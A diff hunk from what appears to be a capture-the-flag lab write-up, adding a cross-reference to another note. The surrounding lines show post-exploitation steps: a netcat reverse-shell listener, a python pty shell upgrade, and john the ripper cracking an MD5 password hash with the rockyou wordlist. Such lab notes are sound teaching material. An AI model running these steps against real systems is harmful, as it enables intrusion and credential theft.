@@ -50,7 +50,7 @@ nc -lvnp 6969
 ```bash
 python -c 'import pty;pty.spawn("/bin/bash")'
 ```
-- print this file ---> `password.raw-md5` and crack the `md5` in the file with john the ripper
+- print this file ---> `password.raw-md5` and crack the `md5` in the file with john the ripper, BTW this note of `john the ripper` mentioned in cracking the hash code in [LinuxRoom-1](LinuxRoom-1.md)
 ```bash
 echo "c3fcd3d76192e4007dfb496cca67e13b" | tee hash && john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash
 ```
